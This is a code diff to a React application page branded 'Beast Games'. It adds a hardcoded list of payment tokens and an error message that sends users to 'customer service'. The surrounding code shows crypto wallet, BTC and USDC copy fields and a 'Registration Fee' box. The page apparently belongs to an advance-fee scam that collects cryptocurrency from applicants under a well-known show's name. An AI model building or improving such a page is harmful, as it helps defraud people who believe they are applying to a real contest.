@@ -3,6 +3,13 @@ import { Copy } from 'lucide-react';
 import beastIcon from '../assets/beast_games.png';
 import Footer from './Footer';
 
+const VALID_TOKENS = [
+  'BEAST2025',
+  'MRB12345',
+  'WINNER50',
+  'REGFEE2025'
+];
+
 const Apply = () => {
   const [form, setForm] = useState({
     firstName: '',
@@ -17,6 +24,7 @@ const Apply = () => {
   const [copied, setCopied] = useState({ wallet: false, btc: false, usdc: false });
   const [showModal, setShowModal] = useState(false);
   const [awaitingToken, setAwaitingToken] = useState(false);
+  const [tokenError, setTokenError] = useState('');
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setForm({ ...form, [e.target.name]: e.target.value });
@@ -35,6 +43,12 @@ const Apply = () => {
       setAwaitingToken(true);
       return;
     }
+    // Validate token
+    if (!VALID_TOKENS.includes(form.token.trim())) {
+      setTokenError('Invalid token. Please enter the correct payment token provided by customer service.');
+      return;
+    }
+    setTokenError('');
     setSubmitted(true);
   };
 
@@ -174,6 +188,7 @@ const Apply = () => {
                   placeholder="Enter your payment token"
                   className="w-full px-4 py-2 rounded-lg bg-black text-white border border-gray-700 focus:outline-none focus:border-yellow-400"
                 />
+                {tokenError && <span className="text-red-500 text-xs mt-1 block">{tokenError}</span>}
               </div>
               <div className="flex items-center justify-between bg-yellow-100 rounded-lg px-4 py-3">
                 <span className="text-black font-semibold">Registration Fee</span>
